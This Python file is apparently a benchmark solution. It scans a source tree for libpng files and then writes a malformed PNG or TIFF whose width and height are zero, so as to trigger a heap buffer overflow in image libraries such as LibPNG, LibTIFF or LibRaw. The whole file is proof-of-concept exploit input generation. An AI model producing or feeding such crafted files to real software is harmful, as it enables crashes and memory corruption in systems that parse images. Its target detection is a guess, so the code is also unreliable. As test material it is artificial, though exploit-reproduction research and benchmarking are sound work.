import struct
import os
import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Vulnerability: Heap Buffer Overflow due to zero width or height images not being checked.
        Target Heuristic: LibRaw/LibTIFF (TIFF format) or LibPNG.
        """
        
        # Detect target library type
        is_png = False
        for root, dirs, files in os.walk(src_path):
            for f in files:
                if "libpng" in f.lower() or "png.c" in f.lower():
                    is_png = True
                    break
            if is_png: break
            
        if is_png:
            # Generate a Malformed PNG with 0 width/height
            png = bytearray(b'\x89PNG\r\n\x1a\n')
            
            # IHDR Chunk: Width=0, Height=0
            # Structure: Length(4), Type(4), Data(13), CRC(4)
            ihdr_data = struct.pack('>IIBBBBB', 0, 0, 8, 2, 0, 0, 0)
            
            png.extend(struct.pack('>I', len(ihdr_data)))
            png.extend(b'IHDR')
            png.extend(ihdr_data)
            png.extend(struct.pack('>I', zlib.crc32(b'IHDR' + ihdr_data) & 0xFFFFFFFF))
            
            # IDAT Chunk (Empty)
            png.extend(struct.pack('>I', 0))
            png.extend(b'IDAT')
            png.extend(struct.pack('>I', zlib.crc32(b'IDAT') & 0xFFFFFFFF))
            
            # IEND Chunk
            png.extend(struct.pack('>I', 0))
            png.extend(b'IEND')
            png.extend(struct.pack('>I', zlib.crc32(b'IEND') & 0xFFFFFFFF))
            
            return bytes(png)
        
        else:
            # Default to TIFF (LibRaw/LibTIFF)
            # Construct a valid TIFF structure with ImageWidth=0 or ImageLength=0
            
            # TIFF Header: Little Endian (II), Version 42, Offset 8
            data = bytearray(b'II\x2a\x00\x08\x00\x00\x00')
            
            entries = []
            
            # 256 ImageWidth: 0 (Vulnerability trigger)
            entries.append((256, 4, 1, 0))
            
            # 257 ImageLength: 0 (Vulnerability trigger)
            entries.append((257, 4, 1, 0))
            
            # 258 BitsPerSample: 8, 8, 8 (Pointer to values)
            entries.append((258, 3, 3, "BITS_OFFSET"))
            
            # 259 Compression: 1 (None)
            entries.append((259, 3, 1, 1))
            
            # 262 PhotometricInterpretation: 2 (RGB)
            entries.append((262, 3, 1, 2))
            
            # 273 StripOffsets: Pointer to data
            entries.append((273, 4, 1, "DATA_OFFSET"))
            
            # 277 SamplesPerPixel: 3
            entries.append((277, 3, 1, 3))
            
            # 278 RowsPerStrip: 1
            entries.append((278, 4, 1, 1))
            
            # 279 StripByteCounts: 64 (Size of dummy data)
            entries.append((279, 4, 1, 64))
            
            # Sort tags by ID
            entries.sort(key=lambda x: x[0])
            
            num_entries = len(entries)
            
            # Offsets
            # Header: 8 bytes
            # IFD: 2 (count) + 12*N + 4 (next)
            ifd_size = 2 + 12 * num_entries + 4
            extra_offset = 8 + ifd_size
            
            # BitsPerSample data (3 shorts = 6 bytes)
            bits_offset = extra_offset
            
            # Image Data
            data_offset = bits_offset + 6
            if data_offset % 2 != 0: data_offset += 1
            
            # Write IFD Count
            data.extend(struct.pack('<H', num_entries))
            
            # Write Entries
            for tag, typ, count, val in entries:
                if val == "BITS_OFFSET":
                    data.extend(struct.pack('<HHII', tag, typ, count, bits_offset))
                elif val == "DATA_OFFSET":
                    data.extend(struct.pack('<HHII', tag, typ, count, data_offset))
                else:
                    data.extend(struct.pack('<HHII', tag, typ, count, val))
            
            # Next IFD Offset (0)
            data.extend(struct.pack('<I', 0))
            
            # Write BitsPerSample data (8, 8, 8)
            data.extend(struct.pack('<HHH', 8, 8, 8))
            
            # Padding
            while len(data) < data_offset:
                data.append(0)
            
            # Write Dummy Image Data
            data.extend(b'\xAA' * 64)
            
            return bytes(data)
